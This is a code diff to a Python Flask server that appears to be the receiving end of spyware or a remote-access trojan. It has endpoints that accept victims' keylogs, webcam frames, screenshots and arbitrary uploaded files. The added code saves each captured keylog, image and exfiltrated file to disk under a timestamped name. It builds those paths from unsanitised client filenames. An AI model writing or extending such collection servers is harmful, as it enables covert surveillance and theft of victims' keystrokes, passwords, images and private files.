@@ -2,6 +2,7 @@ from flask import Flask, request, Response, render_template_string
 import threading
 import time
 from cryptography.fernet import Fernet
+import datetime
 
 
 app = Flask(__name__)
@@ -11,6 +12,7 @@ frame_lock = threading.Lock()
 CURRENT_FRAME = None
 KEYLOG = None
 SCREENSHOT = None
+FILE = None
 
 
 # Load the key
@@ -22,7 +24,15 @@ SCREENSHOT = None
 def keylog():
     global KEYLOG
     KEYLOG = request.form['log']
-    print("KEYLOG: " + KEYLOG + "\n")  
+    current_time = datetime.datetime.now()
+    name = "keylog-" + str(current_time) + ".txt"
+    #save file
+    try:
+        with open('./server/logs/' + name, 'w') as f:
+            f.write(KEYLOG)
+    except:
+        print("Error saving log")
+        return 'Internal server error', 500
     return 'Keylog received', 200
 
 @app.route('/api/webcam', methods=['POST'])
@@ -37,7 +47,37 @@ def screenshot():
     global SCREENSHOT
     file = request.files['file']
     SCREENSHOT = file.read()
+    name = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + "-" + file.filename
+    #save file
+    try:
+        with open('./server/images/' + name, 'wb') as f:
+            f.write(SCREENSHOT)
+    except:
+        print("Error saving image")
+        return 'Internal server error', 500
     return 'Screenshot received', 200
+
+@app.route('/api/files', methods=['POST'])
+def files():
+    global FILE
+    if 'file' not in request.files:
+        return 'No file uploaded', 400
+    file = request.files['file']
+    if file.filename == '':
+        return 'No file uploaded', 400
+    if file:
+        FILE = file.read()
+        name = file.filename + "-"+ datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+        #save file
+        try:
+            with open('./server/files/' + name, 'wb') as f:
+                f.write(FILE)
+        except:
+            print("Error saving file")
+            return 'Internal server error', 500
+        return 'File received', 200
+    return 'No file uploaded', 400
+
 
 def gen_frames():
     while True:
